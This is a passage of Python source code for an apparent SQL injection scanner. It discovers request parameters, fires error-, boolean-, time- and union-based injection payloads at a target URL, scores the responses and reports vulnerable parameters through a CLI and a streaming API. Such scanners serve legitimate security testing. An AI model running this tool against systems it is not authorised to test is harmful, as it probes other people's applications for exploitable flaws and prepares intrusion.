            "baseline_std":  bs.std_dev(),
            "inject_mean":   is_.mean(),
            "inject_std":    is_.std_dev(),
            "delta":         delta,
            "jitter":        jitter,
            "consistency":   consistency,
            "confidence":    confidence,
        }


class UnionDetector:
    def __init__(self, config: ScanConfig, normalizer: ResponseNormalizer):
        self.config = config
        self.normalizer = normalizer

    def detect(self, baseline: BaselineSignature,
               response: requests.Response, payload: str
               ) -> Optional[Dict[str, Any]]:
        if response is None:
            return None
        text = self.normalizer.normalize(response.text[:self.config.max_response_size])
        baseline_text = baseline.normalized_body_preview
        sim = self.normalizer.similarity(text, baseline_text) if baseline_text else 0.0

        signals: List[float] = []
        signals.append(0.5 if response.status_code == 200 else 0.1)
        len_diff = abs(len(response.text) - baseline.response_length)
        len_ratio = len_diff / max(baseline.response_length, 1)
        signals.append(0.6 if len_ratio > 0.05 else 0.2)
        signals.append(0.7 if 0.3 <= sim <= 0.85 else 0.2)

        confidence = sum(signals) / len(signals)
        if confidence < self.config.confidence_threshold:
            return None
        return {"similarity": sim, "length_diff": len_diff,
                "length_ratio": len_ratio, "confidence": confidence}


class ConfidenceEngine:
    @staticmethod
    def classify(confidence: float) -> str:
        if confidence >= 0.95: return "critical"
        if confidence >= 0.80: return "high"
        if confidence >= 0.60: return "medium"
        if confidence >= 0.30: return "low"
        return "informational"

    @staticmethod
    def severity_from_confidence_and_technique(confidence: float, technique: str) -> str:
        base = {
            "error-based":   0.8,
            "boolean-based": 0.7,
            "time-based":    0.6,
            "union-based":   0.65,
        }.get(technique, 0.5)
        score = base * confidence
        if score >= 0.8: return "critical"
        if score >= 0.6: return "high"
        if score >= 0.4: return "medium"
        if score >= 0.2: return "low"
        return "informational"


class FindingValidator:
    @staticmethod
    def classify_status(confidence: float, technique: str, evidence: Dict[str, Any]) -> str:
        if confidence >= 0.85: return "confirmed"
        if confidence >= 0.60: return "probable"
        if confidence >= 0.40: return "possible"
        if confidence >= 0.25: return "inconclusive"
        return "blocked"


# ═══════════════════════════════════════════════════════════════════════════
# Scanner
# ═══════════════════════════════════════════════════════════════════════════
class SQLiScanner:
    def __init__(self,
                 config: Optional[ScanConfig] = None,
                 headers: Optional[Dict[str, str]] = None,
                 cookies: Optional[Dict[str, str]] = None,
                 proxies: Optional[Dict[str, str]] = None):
        self.config = config or ScanConfig()
        self.config.validate()
        self.headers = headers
        self.cookies = cookies
        self.proxies = proxies
        self.normalizer = ResponseNormalizer()
        self.http_client = HTTPClient(self.config, headers, cookies, proxies)
        self.baseline_engine = BaselineEngine(self.http_client, self.normalizer, self.config)
        self.error_detector   = ErrorDetector()
        self.boolean_detector = BooleanDetector(self.config, self.normalizer)
        self.time_detector    = TimeDetector(self.config, self.http_client)
        self.union_detector   = UnionDetector(self.config, self.normalizer)
        self.confidence_engine = ConfidenceEngine()
        self.validator         = FindingValidator()
        self._findings_fingerprints: set = set()
        self.errors = 0
        self._done = 0
        self._total = 0

    # ── helpers ───────────────────────────────────────────────────────
    def extract_parameters(self, url: str) -> Dict[str, str]:
        params = {}
        for k, vals in parse_qs(urlparse(url).query).items():
            params[k] = vals[0] if vals else ""
        return params

    def _discover_parameters(self, url: str) -> Dict[str, str]:
        params = self.extract_parameters(url)
        try:
            r = self.http_client.request("GET", url)
            if r is not None and r.status_code < 400:
                soup = BeautifulSoup(r.text, "html.parser")
                for inp in soup.find_all(["input", "textarea", "select"]):
                    name = inp.get("name")
                    if name and name not in params:
                        params[name] = ""
        except Exception:
            pass
        if not params:
            for k in ("id", "q", "search", "query", "page", "cat", "item",
                      "product", "user", "username", "email", "name", "sort"):
                params[k] = ""
        return params

    def _should_stop(self) -> bool:
        if self.config.stop_event is not None and self.config.stop_event.is_set():
            return True
        if self.http_client._request_count >= self.config.max_requests:
            return True
        return False

    def _emit_progress(self, label: str = "") -> None:
        if not self.config.progress_cb:
            return
        try:
            self.config.progress_cb(self._done, self._total, label)
        except Exception:
            pass

    def _deduplicate_finding(self, finding: ScanFinding) -> bool:
        fp = (finding.parameter, finding.technique,
              finding.database_type or "", finding.status)
        if fp in self._findings_fingerprints:
            return False
        self._findings_fingerprints.add(fp)
        return True

    # ── scanners ──────────────────────────────────────────────────────
    def _scan_error_based(self, url, method, param_name, static_params, payloads
                          ) -> List[ScanFinding]:
        out: List[ScanFinding] = []
        for payload in payloads:
            if self._should_stop(): break
            if method.upper() == "GET":
                p = dict(static_params or {}); p[param_name] = payload.value
                r = self.http_client.request(method, url, params=p)
            else:
                d = dict(static_params or {}); d[param_name] = payload.value
                r = self.http_client.request(method, url, data=d)
            self._done += 1
            self._emit_progress(f"{param_name}:error")
            if r is None:
                self.errors += 1
                continue
            det = self.error_detector.detect(r.text)
            if not det: continue
            conf = det["confidence"]
            status = self.validator.classify_status(conf, "error-based", det)
            f = ScanFinding(
                parameter=param_name, technique="error-based",
                confidence=conf,
                severity=self.confidence_engine.severity_from_confidence_and_technique(conf, "error-based"),
                status=status,
                database_type=det["database_type"],
                evidence={"status_code": r.status_code,
                          "matched_error": det["matched_error"]},
                matched_error=det["matched_error"],
                payload=payload.value,
                response_status=r.status_code,
            )
            if self._deduplicate_finding(f):
                out.append(f)
                if not self.config.continue_after_detection and conf >= 0.8:
                    break
        return out

    def _scan_boolean_based(self, url, method, param_name, static_params, baseline
                            ) -> List[ScanFinding]:
        out: List[ScanFinding] = []
        true_payloads, false_payloads = PayloadRegistry.get_boolean_payloads()
        for tp, fp_ in zip(true_payloads, false_payloads):
            if self._should_stop(): break
            if method.upper() == "GET":
                pt = dict(static_params or {}); pt[param_name] = tp.value
                pf = dict(static_params or {}); pf[param_name] = fp_.value
                rt = self.http_client.request(method, url, params=pt)
                rf = self.http_client.request(method, url, params=pf)
            else:
                dt = dict(static_params or {}); dt[param_name] = tp.value
                df = dict(static_params or {}); df[param_name] = fp_.value
                rt = self.http_client.request(method, url, data=dt)
                rf = self.http_client.request(method, url, data=df)
            self._done += 2
            self._emit_progress(f"{param_name}:boolean")
            if rt is None or rf is None:
                self.errors += 1
                continue
            det = self.boolean_detector.compare(baseline, rt, rf)
            if not det: continue
            conf = det["confidence"]
            status = self.validator.classify_status(conf, "boolean-based", det)
            f = ScanFinding(
                parameter=param_name, technique="boolean-based",
                confidence=conf,
                severity=self.confidence_engine.severity_from_confidence_and_technique(conf, "boolean-based"),
                status=status, database_type=None, evidence=det,
                payload=tp.value,
                response_status=rt.status_code,
                baseline_length=baseline.response_length,
                response_length=len(rt.text),
                similarity=det.get("similarity_true_false"),
            )
            if self._deduplicate_finding(f):
                out.append(f)
                if not self.config.continue_after_detection and conf >= 0.8:
                    break
        return out

    def _scan_time_based(self, url, method, param_name, static_params, payloads
                         ) -> List[ScanFinding]:
        out: List[ScanFinding] = []
        for payload in payloads:
            if self._should_stop(): break
            det = self.time_detector.detect(url, method, payload.value,
                                            param_name, static_params)
            self._done += 1
            self._emit_progress(f"{param_name}:time")
            if not det: continue
            conf = det["confidence"]
            status = self.validator.classify_status(conf, "time-based", det)
            f = ScanFinding(
                parameter=param_name, technique="time-based",
                confidence=conf,
                severity=self.confidence_engine.severity_from_confidence_and_technique(conf, "time-based"),
                status=status, database_type=payload.database,
                evidence=det, payload=payload.value,
            )
            if self._deduplicate_finding(f):
                out.append(f)
                if not self.config.continue_after_detection and conf >= 0.8:
                    break
        return out

    def _scan_union_based(self, url, method, param_name, static_params,
                          baseline, payloads) -> List[ScanFinding]:
        out: List[ScanFinding] = []
        for payload in payloads:
            if self._should_stop(): break
            if method.upper() == "GET":
                p = dict(static_params or {}); p[param_name] = payload.value
                r = self.http_client.request(method, url, params=p)
            else:
                d = dict(static_params or {}); d[param_name] = payload.value
                r = self.http_client.request(method, url, data=d)
            self._done += 1
            self._emit_progress(f"{param_name}:union")
            if r is None:
                self.errors += 1
                continue
            det = self.union_detector.detect(baseline, r, payload.value)
            if not det: continue
            conf = det["confidence"]
            status = self.validator.classify_status(conf, "union-based", det)
            f = ScanFinding(
                parameter=param_name, technique="union-based",
                confidence=conf,
                severity=self.confidence_engine.severity_from_confidence_and_technique(conf, "union-based"),
                status=status, database_type=None, evidence=det,
                payload=payload.value,
                response_status=r.status_code,
                baseline_length=baseline.response_length,
                response_length=len(r.text),
                similarity=det.get("similarity"),
            )
            if self._deduplicate_finding(f):
                out.append(f)
                if not self.config.continue_after_detection and conf >= 0.8:
                    break
        return out

    # ── top-level scan ────────────────────────────────────────────────
    def scan(self, url: str, method: str = "GET",
             params: Optional[Dict[str, str]] = None,
             payloads: Optional[List[str]] = None) -> ScanResult:
        url = _normalize_url(url)
        scan_id = uuid.uuid4().hex[:12]
        started_at = datetime.now(timezone.utc).isoformat()
        t0 = time.time()

        result = ScanResult()
        result.scan_id = scan_id
        result.started_at = started_at
        result.url = url
        result.method = method
        result.status = "running"

        parsed = urlparse(url)
        if not parsed.scheme or not parsed.netloc:
            result.status = "error"
            result.warnings.append("Invalid URL")
            result.completed_at = datetime.now(timezone.utc).isoformat()
            return result

        if params is None:
            params = self._discover_parameters(url)
        if not params:
            params = {"q": ""}
        result.parameters_tested = list(params.keys())

        techniques: List[str] = []
        if self.config.test_error:   techniques.append("error")
        if self.config.test_boolean: techniques.append("boolean")
        if self.config.test_time:    techniques.append("time")
        if self.config.test_union:   techniques.append("union")
        result.techniques_tested = techniques

        # Baseline
        bl_samples = self.baseline_engine.collect_multiple_baselines(
            url, method,
            params=params if method.upper() == "GET" else None,
            data=params if method.upper() == "POST" else None,
        )
        if not bl_samples:
            result.status = "error"
            result.warnings.append("Failed to collect baseline")
            result.completed_at = datetime.now(timezone.utc).isoformat()
            return result

        baseline = bl_samples[0]
        if not self.baseline_engine.is_stable(bl_samples):
            result.warnings.append("Baseline is unstable; results may be less reliable")

        # WAF detection (informational)
        try:
            r0 = self.http_client.request("GET", url)
            if r0 is not None:
                result.waf_detected = _detect_waf(dict(r0.headers), r0.text)
        except Exception:
            pass

        # Build payload lists
        if payloads:
            error_pls = [Payload(p, "error", None, "low", "") for p in payloads]
            time_pls  = [Payload(p, "time",  None, "low", "")
                         for p in payloads if "sleep" in p.lower()
                         or "waitfor" in p.lower() or "pg_sleep" in p.lower()]
            union_pls = [Payload(p, "union", None, "low", "")
                         for p in payloads if "union" in p.lower()]
        else:
            error_pls = PayloadRegistry.get_error_payloads()
            time_pls  = PayloadRegistry.get_time_payloads()
            union_pls = PayloadRegistry.get_union_payloads()

        # Estimate total work for progress
        per_param = 0
        if self.config.test_error:   per_param += len(error_pls)
        if self.config.test_boolean: per_param += 2 * len(PayloadRegistry.BOOLEAN_TRUE)
        if self.config.test_time:    per_param += len(time_pls)
        if self.config.test_union:   per_param += len(union_pls)
        self._total = per_param * len(params)
        self._done = 0

        # Sequential param loop — each param internally parallelizes via HTTP
        # (rate limiter + session handle thread safety).
        total_payloads = 0
        for param_name, _ in params.items():
            if self._should_stop():
                break
            static = {k: v for k, v in params.items() if k != param_name}

            if self.config.test_error and error_pls:
                total_payloads += len(error_pls)
                result.findings.extend(
                    self._scan_error_based(url, method, param_name, static, error_pls)
                )

            if self.config.test_boolean:
                total_payloads += 2 * len(PayloadRegistry.BOOLEAN_TRUE)
                result.findings.extend(
                    self._scan_boolean_based(url, method, param_name, static, baseline)
                )

            if self.config.test_time and time_pls:
                total_payloads += len(time_pls)
                result.findings.extend(
                    self._scan_time_based(url, method, param_name, static, time_pls)
                )

            if self.config.test_union and union_pls:
                total_payloads += len(union_pls)
                result.findings.extend(
                    self._scan_union_based(url, method, param_name, static, baseline, union_pls)
                )

            if self.http_client._request_count >= self.config.max_requests:
                result.status = "request_budget_exhausted"
                break

        result.payloads_tested = total_payloads
        result.requests_sent = self.http_client._request_count
        result.errors = self.errors
        result.vulnerable = len(result.findings) > 0
        result.completed_at = datetime.now(timezone.utc).isoformat()
        result.duration = round(time.time() - t0, 3)
        result.cancelled = bool(
            self.config.stop_event is not None and self.config.stop_event.is_set()
        )
        result.status = "cancelled" if result.cancelled else "completed"

        confident_dbs = [f.database_type for f in result.findings
                         if f.database_type and f.confidence >= 0.5]
        if confident_dbs:
            result.database_hint = max(set(confident_dbs), key=confident_dbs.count)

        return result


# ═══════════════════════════════════════════════════════════════════════════
# Integration adapters
# ═══════════════════════════════════════════════════════════════════════════
def run_sql_injection_scan(
    url: str,
    method: str = "GET",
    params: Optional[Dict[str, str]] = None,
    timeout: float = DEFAULT_TIMEOUT,
    max_threads: int = DEFAULT_MAX_THREADS,
    verify_ssl: bool = False,
    headers: Optional[Dict[str, str]] = None,
    cookies: Optional[Dict[str, str]] = None,
    proxies: Optional[Dict[str, str]] = None,
    payloads: Optional[List[str]] = None,
    test_boolean: bool = True,
    test_error: bool = True,
    test_time: bool = True,
    test_union: bool = True,
    time_based_trigger: float = DEFAULT_TIME_TRIGGER,
    boolean_threshold: float = DEFAULT_BOOLEAN_SIMILARITY_THRESHOLD,
    max_duration: float = DEFAULT_MAX_DURATION,
    rate_limit: float = DEFAULT_RATE_LIMIT,
    cancel_event: Optional[threading.Event] = None,
    progress_cb: Optional[Callable[[int, int, str], None]] = None,
    **kwargs,
) -> Dict[str, Any]:
    """Backward-compatible entry point (used by analytic_manager.py)."""
    config = ScanConfig(
        timeout=timeout,
        max_threads=max_threads,
        verify_ssl=verify_ssl,
        test_boolean=test_boolean,
        test_error=test_error,
        test_time=test_time,
        test_union=test_union,
        time_trigger=time_based_trigger,
        boolean_similarity_threshold=boolean_threshold,
        max_duration=max_duration,
        rate_limit=rate_limit,
        stop_event=cancel_event,
        progress_cb=progress_cb,
    )
    for k, v in kwargs.items():
        if hasattr(config, k):
            setattr(config, k, v)

    scanner = SQLiScanner(config=config, headers=headers,
                          cookies=cookies, proxies=proxies)
    return scanner.scan(url, method, params, payloads).to_dict()


def run(target: str, mode: str = "basic", **kwargs) -> Dict[str, Any]:
    """Orchestrator entry point (used by app.py and Sniper)."""
    url = _normalize_url(target)

    if mode == "expert":
        test_flags = dict(test_error=True, test_boolean=True,
                          test_time=True, test_union=True)
        max_threads = int(kwargs.get("max_threads", 10))
    else:
        test_flags = dict(test_error=True, test_boolean=True,
                          test_time=False, test_union=False)
        max_threads = int(kwargs.get("max_threads", 8))

    try:
        result = run_sql_injection_scan(
            url=url,
            method=str(kwargs.get("method", "GET")),
            params=kwargs.get("params"),
            timeout=float(kwargs.get("timeout", DEFAULT_TIMEOUT)),
            max_threads=max_threads,
            verify_ssl=bool(kwargs.get("verify_ssl", False)),
            max_duration=float(kwargs.get("max_duration", DEFAULT_MAX_DURATION)),
            rate_limit=float(kwargs.get("rate_limit", DEFAULT_RATE_LIMIT)),
            headers=kwargs.get("headers"),
            cookies=kwargs.get("cookies"),
            proxies=kwargs.get("proxies"),
            cancel_event=kwargs.get("cancel_event"),
            progress_cb=kwargs.get("progress_cb"),
            **test_flags,
        )

        vulnerable = bool(result.get("vulnerable"))
        sev_rank = {"critical": 4, "high": 3, "medium": 2, "low": 1}
        top_sev, top_rank = "safe", 0
        for finding in result.get("findings", []):
            sev = str(finding.get("severity", "")).lower()
            if sev_rank.get(sev, 0) > top_rank:
                top_rank, top_sev = sev_rank[sev], sev

        result["mode"]     = mode
        result["severity"] = top_sev if vulnerable else "safe"
        result["summary"]  = (
            f"{len(result.get('findings', []))} SQL injection point(s) found"
            if vulnerable else "No SQL injection detected"
        )
        return {
            "tool":    "sql_map",
            "version": __version__,
            "target":  target,
            "data":    result,
            "error":   None,
        }
    except Exception as e:
        logger.error("SQLi run() failed for %s: %s", url, e, exc_info=True)
        return {
            "tool":    "sql_map",
            "version": __version__,
            "target":  target,
            "data":    {"url": url, "scan_type": "sqli",
                        "vulnerable": False, "findings": []},
            "error":   str(e),
        }


# ═══════════════════════════════════════════════════════════════════════════
# Streaming API (SSE-ready)
# ═══════════════════════════════════════════════════════════════════════════
def run_streaming(
    target: str,
    mode: str = "basic",
    options: Optional[Dict[str, Any]] = None,
    cancel_event: Optional[threading.Event] = None,
) -> Iterator[Dict[str, Any]]:
    """Yield SSE-friendly events: start / progress / result / error."""
    options = options or {}
    url = _normalize_url(target)

    if mode == "expert":
        test_flags = dict(test_error=True, test_boolean=True,
                          test_time=True, test_union=True)
        max_threads = int(options.get("max_threads", 10))
    else:
        test_flags = dict(test_error=True, test_boolean=True,
                          test_time=False, test_union=False)
        max_threads = int(options.get("max_threads", 8))

    events: List[Dict[str, Any]] = []
    events_lock = threading.Lock()
    done = threading.Event()
    holder: Dict[str, Any] = {}

    def _progress(done_count: int, total: int, label: str) -> None:
        pct = int((done_count / total) * 100) if total else 0
        with events_lock:
            events.append({
                "type":    "progress",
                "done":    done_count,
                "total":   total,
                "percent": pct,
                "label":   label,
            })

    def _worker() -> None:
        try:
            holder["result"] = run(
                target, mode,
                method=str(options.get("method", "GET")),
                params=options.get("params"),
                timeout=float(options.get("timeout", DEFAULT_TIMEOUT)),
                max_threads=max_threads,
                verify_ssl=bool(options.get("verify_ssl", False)),
                max_duration=float(options.get("max_duration", DEFAULT_MAX_DURATION)),
                rate_limit=float(options.get("rate_limit", DEFAULT_RATE_LIMIT)),
                headers=options.get("headers"),
                cookies=options.get("cookies"),
                proxies=options.get("proxies"),
                cancel_event=cancel_event,
                progress_cb=_progress,
                **test_flags,
            )
        except Exception as e:
            holder["error"] = str(e)
        finally:
            done.set()

    threading.Thread(target=_worker, daemon=True,
                     name=f"sqlmap-{url[:32]}").start()

    yield {
        "type":    "start",
        "url":     url,
        "mode":    mode,
        "options": {
            "max_threads": max_threads,
            "rate_limit":  options.get("rate_limit", DEFAULT_RATE_LIMIT),
            "techniques":  [k for k, v in test_flags.items() if v],
        },
    }

    while not done.is_set():
        with events_lock:
            pending, events[:] = list(events), []
        for ev in pending:
            yield ev
        done.wait(timeout=0.4)

    with events_lock:
        for ev in events:
            yield ev

    if "error" in holder:
        yield {"type": "error", "message": holder["error"]}
    else:
        yield {"type": "result", "data": holder.get("result", {})}


# ═══════════════════════════════════════════════════════════════════════════
# CLI
# ═══════════════════════════════════════════════════════════════════════════
def main() -> int:
    parser = argparse.ArgumentParser(
        description="Oxysintx SQL Injection Scanner",
        formatter_class=argparse.ArgumentDefaultsHelpFormatter,
    )
    parser.add_argument("url", nargs="?", help="Target URL")
    parser.add_argument("-m", "--method", default="GET", choices=["GET", "POST"])
    parser.add_argument("-p", "--param", action="append",
                        help="Parameter to test (name=value)")
    parser.add_argument("--data",   help="POST data as query string")
    parser.add_argument("--header", action="append", help="Custom header (Key: Value)")
    parser.add_argument("--cookie", help="Cookie string")
    parser.add_argument("--proxy",  help="Proxy URL")
    parser.add_argument("--timeout",      type=float, default=DEFAULT_TIMEOUT)
    parser.add_argument("--threads",      type=int,   default=DEFAULT_MAX_THREADS)
    parser.add_argument("--max-requests", type=int,   default=DEFAULT_MAX_REQUESTS)
    parser.add_argument("--max-duration", type=float, default=DEFAULT_MAX_DURATION)
    parser.add_argument("--rate-limit",   type=float, default=DEFAULT_RATE_LIMIT)
    parser.add_argument("--retries",      type=int,   default=DEFAULT_RETRIES)
    parser.add_argument("--verify-ssl", action="store_true")
    parser.add_argument("--follow-redirects", action="store_true")
    parser.add_argument("--technique", action="append",
                        choices=["error", "boolean", "time", "union"])
    parser.add_argument("--confidence-threshold", type=float,
                        default=DEFAULT_CONFIDENCE_THRESHOLD)
    parser.add_argument("--json",        action="store_true")
    parser.add_argument("--pretty-json", action="store_true")
    parser.add_argument("--stream",      action="store_true",
                        help="stream progress events (SSE-style lines)")
    parser.add_argument("--wordlists",   action="store_true",
                        help="print wordlist metadata and exit")
    parser.add_argument("--verbose",     action="store_true")
    parser.add_argument("--quiet",       action="store_true")
    parser.add_argument("--output",      help="Output file path")
    parser.add_argument("--version", action="version", version=__version__)
    args = parser.parse_args()

    if args.wordlists:
        print(json.dumps(ensure_wordlists(), indent=2))
        return 0

    if not args.url:
        parser.error("url required")

    level = logging.DEBUG if args.verbose else (
        logging.CRITICAL if args.quiet else logging.INFO)
    logger.setLevel(level)
    if not logger.handlers:
        h = logging.StreamHandler()
        h.setFormatter(logging.Formatter("%(levelname)s %(message)s"))
        logger.addHandler(h)

    headers: Dict[str, str] = {}
    if args.header:
        for h in args.header:
            if ":" in h:
                k, v = h.split(":", 1)
                headers[k.strip()] = v.strip()

    cookies = None
    if args.cookie:
        cookies = {}
        for pair in args.cookie.split(";"):
            if "=" in pair:
                k, v = pair.split("=", 1)
                cookies[k.strip()] = v.strip()

    proxies = {"http": args.proxy, "https": args.proxy} if args.proxy else None

    params: Dict[str, str] = {}
    if args.param:
        for p in args.param:
            if "=" in p:
                k, v = p.split("=", 1); params[k] = v
            else:
                params[p] = ""
    if args.data:
        for pair in args.data.split("&"):
            if "=" in pair:
                k, v = pair.split("=", 1); params[k] = v

    if args.stream:
        options = {
            "method":       args.method,
            "params":       params or None,
            "timeout":      args.timeout,
            "max_threads":  args.threads,
            "max_duration": args.max_duration,
            "rate_limit":   args.rate_limit,
            "headers":      headers or None,
            "cookies":      cookies,
            "proxies":      proxies,
            "verify_ssl":   args.verify_ssl,
        }
        for ev in run_streaming(args.url, "expert" if args.technique else "basic", options):
            t = ev.get("type")
            if t == "start":
                print(f"[start] {ev['url']}  mode={ev['mode']}  "
                      f"techniques={ev['options']['techniques']}")
            elif t == "progress":
                print(f"[{ev['percent']:3d}%] {ev['done']}/{ev['total']}  {ev['label']}")
            elif t == "result":
                if args.json or args.pretty_json:
                    print(json.dumps(ev["data"], indent=2 if args.pretty_json else None))
            elif t == "error":
                print(f"[ERROR] {ev['message']}", file=sys.stderr)
        return 0

    config = ScanConfig(
        timeout=args.timeout,
        max_threads=args.threads,
        verify_ssl=args.verify_ssl,
        follow_redirects=args.follow_redirects,
        max_requests=args.max_requests,
        max_duration=args.max_duration,
        rate_limit=args.rate_limit,
        retries=args.retries,
        confidence_threshold=args.confidence_threshold,
    )
    if args.technique:
        config.test_error   = "error"   in args.technique
        config.test_boolean = "boolean" in args.technique
        config.test_time    = "time"    in args.technique
        config.test_union   = "union"   in args.technique

    scanner = SQLiScanner(config=config, headers=headers,
                          cookies=cookies, proxies=proxies)
    result = scanner.scan(args.url, args.method, params or None)

    if args.json or args.pretty_json:
        out = json.dumps(result.to_dict(),
                         indent=2 if args.pretty_json else None)
        if args.output:
            with open(args.output, "w") as f: f.write(out)
        if not args.quiet:
            print(out)
        return 0 if result.vulnerable else 1

    lines = []
    lines.append("Oxysintx SQL Injection Scanner")
    lines.append("─" * 36)
    lines.append(f"Target       : {result.url}")
    lines.append(f"Method       : {result.method}")
    lines.append(f"Parameters   : {', '.join(result.parameters_tested) or 'none'}")
    lines.append(f"Techniques   : {', '.join(result.techniques_tested)}")
    lines.append("")
    lines.append(f"Scan status  : {result.status}")
    lines.append(f"Requests     : {result.requests_sent}")
    lines.append(f"Duration     : {result.duration:.2f}s")
    if result.waf_detected:
        lines.append(f"WAF          : {result.waf_detected}")
    lines.append("")
    if result.findings:
        lines.append("Findings")
        lines.append("─" * 36)
        for f in result.findings:
            label = ConfidenceEngine.classify(f.confidence)
            lines.append(f"[{label.upper()}] {f.parameter}")
            lines.append(f"  Technique   : {f.technique}")
            lines.append(f"  Confidence  : {f.confidence:.2f}")
            lines.append(f"  DBMS        : {f.database_type or 'unknown'}")
            lines.append(f"  Status      : {f.status}")
            lines.append("")
    else:
        lines.append("No vulnerabilities detected.")
    out = "\n".join(lines)
    if args.output:
        with open(args.output, "w") as f: f.write(out)
    if not args.quiet:
        print(out)
    return 0 if result.vulnerable else 1


if __name__ == "__main__":
    sys.exit(main())
